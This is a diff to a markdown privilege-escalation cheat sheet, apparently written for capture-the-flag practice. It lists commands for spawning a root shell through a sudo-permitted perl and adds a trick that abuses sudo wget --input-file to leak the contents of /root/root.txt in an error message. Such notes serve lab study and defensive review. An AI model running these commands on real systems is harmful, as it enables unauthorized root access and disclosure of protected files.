@@ -1,5 +1,5 @@
 - ## Privilege escalation <a name="privilegeescalation"></a>
-- # easy way to get root/root.txt
+[easy way to get root/root.txt](#root.txt)
 - `cat /etc/issue`
 ```
 find / -o -group `id -g` -perm \ 
@@ -63,3 +63,11 @@ perl —e 'exec "/bin/sh";'
 - if you find ```(ALL : ALL) NOPASSWD: /usr/bin/perl``` in ```sudo -l```
   - then use the below command it will give you the root privilege
   - ```sudo perl -e 'exec "/bin/bash";'```
+
+# easy way to get root/root.txt <a name="root.txt"></a>
+1️⃣ Read the Root Flag Using --input-file:
+
+Use a root-only file (/root/root.txt) as an input to wget.
+It will try to parse it as a URL, fail, and leak the content (flag) in the error.
+
+sudo wget --input-file=/root/root.txt
